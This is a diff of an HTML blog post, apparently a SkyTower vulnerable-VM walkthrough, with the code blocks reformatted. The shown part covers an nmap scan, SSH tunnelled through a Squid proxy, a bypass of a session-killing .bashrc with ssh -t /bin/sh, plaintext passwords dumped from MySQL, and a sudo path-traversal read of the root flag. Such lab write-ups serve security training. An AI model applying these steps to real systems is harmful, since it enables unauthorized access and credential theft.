@@ -86,45 +86,84 @@
 
 <p>Obviously NMAP is used to get a quick rundown of what services are available.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# nmap -sS -T4 -O -A -p1-65535 192.168.0.106</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T4 -O -A -p1-65535 192.168.0.106
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-08-05 22:59 BST
+</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.0.106
+</span><span class='line'>Host is up <span class="o">(</span>0.00s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: <span class="m">65532</span> closed ports
+</span><span class='line'>PORT     STATE    SERVICE    VERSION
+</span><span class='line'>22/tcp   filtered ssh
+</span><span class='line'>80/tcp   open     http       Apache httpd 2.2.22 <span class="o">((</span>Debian<span class="o">))</span>
+</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+</span><span class='line'>3128/tcp open     http-proxy Squid http proxy 3.1.20
+</span><span class='line'><span class="p">|</span>_http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 400<span class="o">)</span>
+</span><span class='line'><span class="p">|</span> http-open-proxy: Potentially OPEN proxy.
+</span><span class='line'><span class="p">|</span>_Methods supported:  GET
+</span><span class='line'><span class="p">|</span>_http-title: ERROR: The requested URL could not be retrieved
+</span><span class='line'>MAC Address: 08:00:27:54:4A:37 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
+</span><span class='line'>No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see http://nmap.org/submit/ <span class="o">)</span>.
+</span><span class='line'>TCP/IP fingerprint:
+</span><span class='line'>OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>6.46%E<span class="o">=</span>4%D<span class="o">=</span>8/5%OT<span class="o">=</span>80%CT<span class="o">=</span>1%CU<span class="o">=</span>42026%PV<span class="o">=</span>Y%DS<span class="o">=</span>1%DC<span class="o">=</span>D%G<span class="o">=</span>Y%M<span class="o">=</span>080027%TM
+</span><span class='line'>OS:<span class="o">=</span>53E153CE%P<span class="o">=</span>i686-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>103%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%CI<span class="o">=</span>I%II<span class="o">=</span>I%TS
+</span><span class='line'>OS:<span class="o">=</span>8<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M5B4ST11NW3%O2<span class="o">=</span>M5B4ST11NW3%O3<span class="o">=</span>M5B4NNT11NW3%O4<span class="o">=</span>M5B4ST11NW3%O5<span class="o">=</span>M
+</span><span class='line'>OS:5B4ST11NW3%O6<span class="o">=</span>M5B4ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>3890%W2<span class="o">=</span>3890%W3<span class="o">=</span>3890%W4<span class="o">=</span>3890%W5<span class="o">=</span>3890%W6<span class="o">=</span>38
+</span><span class='line'>OS:90<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>3908%O<span class="o">=</span>M5B4NNSNW3%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>
+</span><span class='line'>OS:S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q
+</span><span class='line'>OS:<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A
+</span><span class='line'>OS:%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y
+</span><span class='line'>OS:%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T
+</span><span class='line'>OS:<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Network Distance: <span class="m">1</span> hop
+</span><span class='line'>
+</span><span class='line'>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'><span class="m">1</span>   0.00 ms 192.168.0.106
+</span><span class='line'>
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 33.35 seconds
+</span><span class='line'>root@pwk:~#
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-08-05 22:59 BST
-Nmap scan report for 192.168.0.106
-Host is up (0.00s latency).
-Not shown: 65532 closed ports
-PORT     STATE    SERVICE    VERSION
-22/tcp   filtered ssh
-80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
-|<em>http-title: Site doesn&rsquo;t have a title (text/html).
-3128/tcp open     http-proxy Squid http proxy 3.1.20
-|</em>http-methods: No Allow or Public header in OPTIONS response (status code 400)
-| http-open-proxy: Potentially OPEN proxy.
-|<em>Methods supported:  GET
-|</em>http-title: ERROR: The requested URL could not be retrieved
-MAC Address: 08:00:27:54:4A:37 (Cadmus Computer Systems)
-No exact OS matches for host (If you know what OS is running on it, see <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> ).
-TCP/IP fingerprint:
-OS:SCAN(V=6.46%E=4%D=8/5%OT=80%CT=1%CU=42026%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
-OS:=53E153CE%P=i686-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS
-OS:=8)OPS(O1=M5B4ST11NW3%O2=M5B4ST11NW3%O3=M5B4NNT11NW3%O4=M5B4ST11NW3%O5=M
-OS:5B4ST11NW3%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=38
-OS:90)ECN(R=Y%DF=Y%T=40%W=3908%O=M5B4NNSNW3%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
-OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
-OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
-OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
-OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
-OS:=40%CD=S)</p>
-
-<p>Network Distance: 1 hop</p>
-
-<p>TRACEROUTE
-HOP RTT     ADDRESS
-1   0.00 ms 192.168.0.106</p>
-
-<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
-Nmap done: 1 IP address (1 host up) scanned in 33.35 seconds
-root@pwk:~# [/plain]</p>
 
 <p>Not very exciting - SSH, HTTP and a SQUID proxy. Interestingly SSH is filtered, which means no easy route in :(</p>
 
@@ -156,43 +195,77 @@ root@pwk:~# [/plain]</p>
 
 <p>We now have SSH login credentials, but you&rsquo;ll remember earlier on that SSH is filtered externally. It is, however, possible to leverage the SQUID proxy to get an SSH session using proxytunnel to bind a local port.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# proxytunnel -p 192.168.0.106:3128 -d 127.0.0.1:22 -a 222[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# proxytunnel -p 192.168.0.106:3128 -d 127.0.0.1:22 -a 222
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>A quick netstat shows that our local port is available</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# netstat -antp tcp | grep :222
-Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-tcp        0      0 0.0.0.0:222             0.0.0.0:*               LISTEN      5135/proxytunnel: [/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# netstat -antp tcp <span class="p">|</span> grep :222
+</span><span class='line'>Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
+</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span><span class='line'>tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:222             0.0.0.0:*               LISTEN      5135/proxytunnel:
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Let us SSH into it with the provided credentials</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x6a;&#x6f;&#x68;&#x6e;&#x40;&#49;&#50;&#x37;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;">&#106;&#111;&#104;&#110;&#64;&#x31;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#x2e;&#x31;</a> -p 222
-The authenticity of host &lsquo;[127.0.0.1]:222 ([127.0.0.1]:222)&rsquo; can&rsquo;t be established.
-ECDSA key fingerprint is f6:3b:95:46:6e:a7:0f:72:1a:67:9e:9b:8a:48:5e:3d.
-Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added &lsquo;[127.0.0.1]:222&rsquo; (ECDSA) to the list of known hosts.
-<a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#106;&#111;&#x68;&#x6e;&#x40;&#49;&#50;&#55;&#x2e;&#x30;&#46;&#x30;&#46;&#x31;">&#x6a;&#x6f;&#104;&#110;&#x40;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#x2e;&#49;</a>&rsquo;s password:
-Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh john@127.0.0.1 -p 222
+</span><span class='line'>The authenticity of host <span class="s1">&#39;[127.0.0.1]:222 ([127.0.0.1]:222)&#39;</span> can<span class="s1">&#39;t be established.</span>
+</span><span class='line'><span class="s1">ECDSA key fingerprint is f6:3b:95:46:6e:a7:0f:72:1a:67:9e:9b:8a:48:5e:3d.</span>
+</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
+</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span><span class="o">[</span>127.0.0.1<span class="o">]</span>:222<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
+</span><span class='line'><span class="s1">john@127.0.0.1&#39;</span>s password:
+</span><span class='line'>Linux SkyTower 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.54-2 x86_64</span>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>Last login: Fri Jun <span class="m">20</span> 07:41:08 2014
+</span><span class='line'>
+</span><span class='line'>Funds have been withdrawn
+</span><span class='line'>Connection to 127.0.0.1 closed.
+</span><span class='line'>root@pwk:~#
+</span></code></pre></td></tr></table></div></figure>
 
-<p>The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.</p>
-
-<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Fri Jun 20 07:41:08 2014</p>
-
-<p>Funds have been withdrawn
-Connection to 127.0.0.1 closed.
-root@pwk:~#[/plain]</p>
 
 <p>Seems like the admins have been clever, and have edited this users .bashrc file to terminate the session upon connection. It is possible to use the -t argument of the SSH client to execute an application when a connection is made, so how about running a shell ?</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#106;&#x6f;&#x68;&#110;&#64;&#x31;&#x32;&#x37;&#x2e;&#48;&#x2e;&#48;&#46;&#x31;">&#x6a;&#x6f;&#x68;&#x6e;&#x40;&#49;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#x31;</a> -p 222 -t &ldquo;/bin/sh&rdquo;
-<a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x6a;&#111;&#104;&#110;&#x40;&#49;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#49;">&#106;&#111;&#104;&#110;&#64;&#49;&#x32;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#x31;</a>&rsquo;s password: hereisjohn
-john@SkyTower:~$[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh john@127.0.0.1 -p <span class="m">222</span> -t <span class="s2">&quot;/bin/sh&quot;</span>
+</span><span class='line'>john@127.0.0.1<span class="err">&#39;</span>s password: hereisjohn
+</span><span class='line'>john@SkyTower:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>First things first, that SQLi filter - what did it look like in it&rsquo;s entirety ?</p>
 
@@ -207,94 +280,163 @@ It&rsquo;s obvious while looking at the /var/www/login.php file that the applica
 
 <p>Using the mysql client, it is possible to obtain all users passwords, as they are stored unencrypted in the login table within the SkyTech database</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-john@SkyTower:~$ mysql -uroot -proot
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 51
-Server version: 5.5.35-0+wheezy1 (Debian)</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@SkyTower:~<span class="nv">$ </span>mysql -uroot -proot
+</span><span class='line'>Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+</span><span class='line'>Your MySQL connection id is 51
+</span><span class='line'>Server version: 5.5.35-0+wheezy1 <span class="o">(</span>Debian<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2013, Oracle and/or its affiliates. All rights reserved.
+</span><span class='line'>
+</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
+</span><span class='line'>affiliates. Other names may be trademarks of their respective
+</span><span class='line'>owners.
+</span><span class='line'>
+</span><span class='line'>Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+</span><span class='line'>
+</span><span class='line'>mysql&gt; use SkyTech<span class="p">;</span>
+</span><span class='line'>Reading table information <span class="k">for</span> completion of table and column names
+</span><span class='line'>You can turn off this feature to get a quicker startup with -A
+</span><span class='line'>
+</span><span class='line'>Database changed
+</span><span class='line'>mysql&gt; show tables<span class="p">;</span>
+</span><span class='line'>+-------------------+
+</span><span class='line'><span class="p">|</span> Tables_in_SkyTech <span class="p">|</span>
+</span><span class='line'>+-------------------+
+</span><span class='line'><span class="p">|</span> login             <span class="p">|</span>
+</span><span class='line'>+-------------------+
+</span><span class='line'><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>mysql&gt; <span class="k">select</span> * from login<span class="p">;</span>
+</span><span class='line'>+----+---------------------+--------------+
+</span><span class='line'><span class="p">|</span> id <span class="p">|</span> email               <span class="p">|</span> password     <span class="p">|</span>
+</span><span class='line'>+----+---------------------+--------------+
+</span><span class='line'><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> john@skytech.com    <span class="p">|</span> hereisjohn   <span class="p">|</span>
+</span><span class='line'><span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> sara@skytech.com    <span class="p">|</span> ihatethisjob <span class="p">|</span>
+</span><span class='line'><span class="p">|</span>  <span class="m">3</span> <span class="p">|</span> william@skytech.com <span class="p">|</span> senseable    <span class="p">|</span>
+</span><span class='line'>+----+---------------------+--------------+
+</span><span class='line'><span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>mysql&gt;
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Copyright &copy; 2000, 2013, Oracle and/or its affiliates. All rights reserved.</p>
-
-<p>Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.</p>
-
-<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>
-
-<p>mysql> use SkyTech;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A</p>
-
-<p>Database changed
-mysql> show tables;
-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-| Tables_in_SkyTech |
-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-| login             |
-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-1 row in set (0.00 sec)</p>
-
-<p>mysql> select * from login;
-+&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
-| id | email               | password     |
-+&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
-|  1 | <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#106;&#111;&#x68;&#110;&#64;&#115;&#x6b;&#x79;&#x74;&#101;&#x63;&#x68;&#46;&#x63;&#x6f;&#109;">&#x6a;&#111;&#x68;&#x6e;&#x40;&#x73;&#107;&#x79;&#x74;&#101;&#x63;&#x68;&#46;&#99;&#x6f;&#109;</a>    | hereisjohn   |
-|  2 | <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#115;&#97;&#114;&#x61;&#64;&#x73;&#x6b;&#121;&#116;&#x65;&#x63;&#104;&#x2e;&#99;&#111;&#109;">&#115;&#97;&#x72;&#x61;&#64;&#x73;&#107;&#x79;&#116;&#101;&#x63;&#x68;&#x2e;&#x63;&#x6f;&#x6d;</a>    | ihatethisjob |
-|  3 | <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x77;&#x69;&#x6c;&#x6c;&#105;&#x61;&#x6d;&#64;&#x73;&#x6b;&#x79;&#116;&#101;&#x63;&#104;&#x2e;&#x63;&#x6f;&#109;">&#119;&#105;&#108;&#x6c;&#x69;&#x61;&#x6d;&#x40;&#x73;&#107;&#x79;&#116;&#x65;&#99;&#x68;&#x2e;&#99;&#x6f;&#109;</a> | senseable    |
-+&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
-3 rows in set (0.00 sec)</p>
-
-<p>mysql>[/plain]</p>
 
 <p>That&rsquo;s handy - William looks like he&rsquo;s revered by the company, as his password is (a typo) of &lsquo;sensible&rsquo;. Unfortunately his credentials do not work</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-john@SkyTower:~$ su william
-Password:
-su: Authentication failure
-john@SkyTower:~$[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@SkyTower:~<span class="nv">$ </span>su william
+</span><span class='line'>Password:
+</span><span class='line'>su: Authentication failure
+</span><span class='line'>john@SkyTower:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>How about Sara ?</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-john@SkyTower:~$ su sara
-Password:</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@SkyTower:~<span class="nv">$ </span>su sara
+</span><span class='line'>Password:
+</span><span class='line'>
+</span><span class='line'>Funds have been withdrawn
+</span><span class='line'>john@SkyTower:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Funds have been withdrawn
-john@SkyTower:~$
-[/plain]</p>
 
 <p>We&rsquo;re hitting on the same issue that we had with John - SSH -t to the rescue once again, but this time using a different shell (for some reason /bin/bash does not work)</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x73;&#x61;&#x72;&#97;&#x40;&#x31;&#50;&#x37;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#49;">&#115;&#97;&#114;&#x61;&#64;&#49;&#50;&#55;&#x2e;&#x30;&#46;&#x30;&#x2e;&#x31;</a> -p 222 -t /bin/sh
-<a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#x73;&#x61;&#x72;&#x61;&#64;&#49;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#46;&#x31;">&#x73;&#97;&#114;&#x61;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#x2e;&#x30;&#x2e;&#x31;</a>&rsquo;s password: ihatethisjob
-$[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh sara@127.0.0.1 -p <span class="m">222</span> -t /bin/sh
+</span><span class='line'>sara@127.0.0.1<span class="err">&#39;</span>s password: ihatethisjob
+</span><span class='line'><span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p><img src="http://i.imgur.com/PbksBXu.gif" alt="" /></p>
 
 <p>Sara has been entrusted with sudo ability, albeit very locked down, but the available commands running as the root user can be used to leverage directory traversal to read files elsewhere on the filesystem. Files such as /root/flag.txt, which provides us with the root password</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ sudo -l
-Matching Defaults entries for sara on this host:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>sudo -l
+</span><span class='line'>Matching Defaults entries <span class="k">for</span> sara on this host:
+</span><span class='line'>    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span><span class='line'>
+</span><span class='line'>User sara may run the following commands on this host:
+</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/cat /accounts/*, <span class="o">(</span>root<span class="o">)</span> /bin/ls /accounts/*
+</span><span class='line'><span class="nv">$ </span>sudo cat /accounts/../../root/flag.txt
+</span><span class='line'>Congratz, have a cold one to celebrate!
+</span><span class='line'>root password is theskytower
+</span><span class='line'><span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>User sara may run the following commands on this host:
